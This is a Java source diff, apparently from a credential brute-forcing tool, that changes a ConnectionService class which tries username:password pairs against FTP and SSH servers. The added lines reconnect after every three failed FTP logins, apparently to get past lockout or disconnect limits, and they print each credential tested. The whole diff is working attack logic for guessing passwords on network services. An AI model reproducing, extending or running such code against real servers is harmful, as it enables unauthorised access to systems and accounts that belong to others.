@@ -116,9 +116,16 @@ public class ConnectionService implements IConnectionService {
 	    } else if (FTPReply.isPositiveCompletion(replyCode)) {
 		System.out.println("SUCCESS - FTP ready --> " + replyCode);
 		System.out.println("IP--> " + ip);
+		Integer counter = 0;
 		for (String userPass : userPassList) {
+		    if (counter == 3) {
+			ftpClient.disconnect();
+			ftpClient.connect(ip, port);
+			counter = 0;
+		    }
 		    username = userPass.split(":")[0];
 		    password = userPass.split(":")[1];
+		    System.out.println("Credentials tested --> User: " + username + " | Password: " + password);
 		    try {
 			Boolean loggedIn = ftpClient.login(username, password);
 			// Store login credentials
@@ -127,9 +134,12 @@ public class ConnectionService implements IConnectionService {
 				    "Correct login credentials --> User: " + username + " | Password: " + password);
 			} else {
 			    System.out.println("Incorrect login credentials");
+			    counter += 1;
 			}
 		    } catch (IOException e) {
 			System.out.println("Incorrect login credentials --> " + e);
+			ftpClient.disconnect();
+			ftpClient.connect(ip, port);
 			continue;
 		    }
 		}
@@ -166,8 +176,8 @@ public class ConnectionService implements IConnectionService {
 	    password = userPass.split(":")[1];
 	    try {
 		clientSSH.connect(ip);
+		System.out.println("Credentials tested --> User: " + username + " | Password: " + password);
 		clientSSH.authPassword(username, password);
-
 		// Store login credentials
 		if (clientSSH.isConnected() && clientSSH.isAuthenticated()) {
 		    System.out.println("Correct login credentials --> User: " + username + " | Password: " + password);
